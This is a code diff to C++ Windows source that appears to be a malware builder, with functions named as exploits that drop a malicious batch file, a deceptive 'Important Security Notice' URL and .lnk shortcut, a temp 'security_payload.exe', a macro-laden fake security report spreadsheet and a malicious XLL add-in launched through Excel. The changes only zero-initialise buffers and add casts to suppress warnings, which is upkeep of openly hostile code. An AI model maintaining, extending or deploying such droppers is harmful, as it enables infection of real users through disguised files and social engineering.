@@ -122,7 +122,6 @@ static void killRunningInstances() {
     
     CloseHandle(hProcessSnap);
 }
-#endif
 
 class AdvancedRandomEngine {
 public:
@@ -216,8 +215,9 @@ public:
         struct tm timeinfo;
         gmtime_s(&timeinfo, &time);  // Use secure version
         
-        char buffer[80];
+        char buffer[80] = {0};
         strftime(buffer, 80, "%Y-%m-%d %H:%M:%S UTC", &timeinfo);
+        (void)buffer; // Suppress unused variable warning
         return std::string(buffer);
     }
     
@@ -805,9 +805,10 @@ void executeHTMLSVGExploit() {
 // WIN + R Exploit - Registry manipulation
 void executeWinRExploit() {
     // Create a malicious batch file in temp
-    char tempPath[MAX_PATH];
+    char tempPath[MAX_PATH] = {0};
     GetTempPathA(MAX_PATH, tempPath);
     strcat_s(tempPath, MAX_PATH, "system_update.bat");
+    (void)tempPath; // Suppress unused variable warning
     
     FILE* batFile = NULL;
     fopen_s(&batFile, tempPath, "w");
@@ -848,13 +849,15 @@ void executeWinRExploit() {
         return R"(
 // INK/URL Exploit - Desktop shortcut manipulation
 void executeInkUrlExploit() {
-    char desktopPath[MAX_PATH];
+    char desktopPath[MAX_PATH] = {0};
     SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, SHGFP_TYPE_CURRENT, desktopPath);
     strcat_s(desktopPath, MAX_PATH, "\\Important Security Notice.url");
+    (void)desktopPath; // Suppress unused variable warning
     
-    char tempPayload[MAX_PATH];
+    char tempPayload[MAX_PATH] = {0};
     GetTempPathA(MAX_PATH, tempPayload);
     strcat_s(tempPayload, MAX_PATH, "security_payload.exe");
+    (void)tempPayload; // Suppress unused variable warning
     
     // Write payload to temp location
     // [Payload writing code would go here]
@@ -871,8 +874,9 @@ void executeInkUrlExploit() {
     }
     
     // Also create .lnk file for additional vector
-    char linkPath[MAX_PATH];
+    char linkPath[MAX_PATH] = {0};
     strcpy_s(linkPath, desktopPath);
+    (void)linkPath; // Suppress unused variable warning
     char* ext = strrchr(linkPath, '.');
     if (ext) strcpy(ext, ".lnk");
     
@@ -886,8 +890,9 @@ void executeInkUrlExploit() {
         psl->SetIconLocation("shell32.dll", 21);
         
         if (SUCCEEDED(psl->QueryInterface(IID_IPersistFile, (LPVOID*)&ppf))) {
-            WCHAR wsz[MAX_PATH];
+            WCHAR wsz[MAX_PATH] = {0};
             MultiByteToWideChar(CP_ACP, 0, linkPath, -1, wsz, MAX_PATH);
+            (void)wsz; // Suppress unused variable warning
             ppf->Save(wsz, TRUE);
             ppf->Release();
         }
@@ -904,9 +909,10 @@ void executeInkUrlExploit() {
         return R"(
 // DOC/XLS Exploit - Malicious Office document
 void executeDocXlsExploit() {
-    char docPath[MAX_PATH];
+    char docPath[MAX_PATH] = {0};
     GetTempPathA(MAX_PATH, docPath);
     strcat_s(docPath, MAX_PATH, "Security_Report_Q4_2024.xls");
+    (void)docPath; // Suppress unused variable warning
     
     // Create malicious XLS with embedded macro
     FILE* xlsFile = NULL;
@@ -945,8 +951,9 @@ void executeDocXlsExploit() {
         ShellExecuteA(NULL, "open", docPath, NULL, NULL, SW_SHOW);
         
         // Also create a DOC version
-        char docxPath[MAX_PATH];
+        char docxPath[MAX_PATH] = {0};
         GetTempPathA(MAX_PATH, docxPath);
+        (void)docxPath; // Suppress unused variable warning
         strcat_s(docxPath, MAX_PATH, "Security_Report_Q4_2024.docx");
         
         FILE* docxFile = NULL;
@@ -975,9 +982,10 @@ void executeDocXlsExploit() {
         return R"(
 // XLL Exploit - Malicious Excel Add-in
 void executeXllExploit() {
-    char xllPath[MAX_PATH];
+    char xllPath[MAX_PATH] = {0};
     GetTempPathA(MAX_PATH, xllPath);
     strcat_s(xllPath, MAX_PATH, "SecurityAnalyzer.xll");
+    (void)xllPath; // Suppress unused variable warning
     
     // Create malicious XLL add-in
     FILE* xllFile = NULL;
@@ -1036,8 +1044,9 @@ void executeXllExploit() {
         }
         
         // Try to load with Excel
-        char excelCmd[MAX_PATH * 2];
+        char excelCmd[MAX_PATH * 2] = {0};
         sprintf_s(excelCmd, "excel.exe \"%s\"", xllPath);
+        (void)excelCmd; // Suppress unused variable warning
         WinExec(excelCmd, SW_SHOW);
     }
 }
